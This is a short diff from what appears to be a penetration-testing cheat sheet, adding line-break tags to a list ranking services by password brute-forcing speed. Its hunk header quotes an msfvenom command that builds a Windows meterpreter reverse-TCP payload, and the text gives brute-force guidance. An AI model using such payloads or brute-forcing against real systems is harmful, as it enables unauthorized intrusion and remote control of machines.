@@ -382,10 +382,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 Cracking a password is mostly based upon educated guessing, heavily depending on the target's predictability or inclination towards simplicity when creating a password.
 Certain services are not worth attempting to bruteforce due to the sheer amount of time it will consume. Some common services and their bruteforcing speeds are as follows:
 <br>Fastest: Kerberos, LDAP</br>
-Fast: HTTP/S, FTP
-Medium: SMB
-Slow: RDP
-Very Slow: SSH
+<br>Fast: HTTP/S, FTP</br>
+<br>Medium: SMB</br>
+<br>Slow: RDP</br>
+<br>Very Slow: SSH</br>
 
 
 #### 
